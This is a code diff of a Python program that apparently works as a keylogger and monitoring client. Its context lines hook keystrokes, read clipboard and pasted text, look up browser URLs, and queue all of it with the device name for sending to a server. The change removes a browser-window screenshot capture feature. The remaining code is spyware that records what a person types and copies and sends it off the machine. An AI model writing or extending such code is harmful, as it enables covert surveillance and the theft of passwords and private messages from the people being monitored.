@@ -155,22 +155,6 @@ def get_browser_url(app_name):
     return ""
 
 
-def capture_browser_screenshot(app_name):
-    browser_names = ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe")
-    executable = app_name.split(" - ", 1)[0].strip().lower()
-    if executable not in browser_names:
-        return ""
-
-    try:
-        image = ImageGrab.grab(all_screens=False)
-        image.thumbnail((1600, 1000))
-        output = BytesIO()
-        image.convert("RGB").save(output, format="JPEG", quality=60, optimize=True)
-        return base64.b64encode(output.getvalue()).decode("ascii")
-    except Exception:
-        return ""
-
-
 def get_clipboard_text():
     if os.name != "nt":
         return ""
@@ -424,7 +408,7 @@ def upload_device_screenshot(screenshot_base64):
         return False
 
 
-def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, is_copied=False, screenshot_base64=""):
+def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, is_copied=False):
     global last_message_id
     last_message_id = max(last_message_id + 1, int(time.time() * 1000))
     payload = {
@@ -435,7 +419,6 @@ def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, 
         "device_name": device_name,
         "app_name": app_name,
         "source_url": source_url,
-        "screenshot_base64": screenshot_base64,
         "is_pasted": is_pasted,
         "is_copied": is_copied,
     }
@@ -546,8 +529,8 @@ def message_sender():
     last_retry_at = 0
     while True:
         try:
-            text, app_name, source_url, raw_text, is_pasted, is_copied, screenshot_base64 = message_queue.get(timeout=5)
-            send_message(text, app_name, source_url, raw_text, is_pasted, is_copied, screenshot_base64)
+            text, app_name, source_url, raw_text, is_pasted, is_copied = message_queue.get(timeout=5)
+            send_message(text, app_name, source_url, raw_text, is_pasted, is_copied)
             message_queue.task_done()
         except Exception:
             pass
@@ -585,8 +568,7 @@ def queue_copied_clipboard(target):
     copied_text = get_clipboard_text().strip()
     if copied_text:
         source_url = get_browser_url(target)
-        message_queue.put((copied_text, target, source_url, copied_text, False, True,
-                   capture_browser_screenshot(target) if not source_url else ""))
+        message_queue.put((copied_text, target, source_url, copied_text, False, True))
 
 
 def flush_message_buffer():
@@ -601,8 +583,7 @@ def flush_message_buffer():
     if text:
         target = active_target or get_active_app()
         source_url = get_browser_url(target)
-        message_queue.put((text, target, source_url, raw_text, False, False,
-                   capture_browser_screenshot(target) if not source_url else ""))
+        message_queue.put((text, target, source_url, raw_text, False, False))
     active_target = None
     active_target_key = None
 
@@ -640,8 +621,7 @@ def on_press(key):
                 flush_message_buffer()
                 target, target_key = get_active_target()
                 source_url = get_browser_url(target)
-                message_queue.put((pasted_text, target, source_url, pasted_text, True, False,
-                                   capture_browser_screenshot(target) if not source_url else ""))
+                message_queue.put((pasted_text, target, source_url, pasted_text, True, False))
             return
 
         symbol = normalize_key(key)
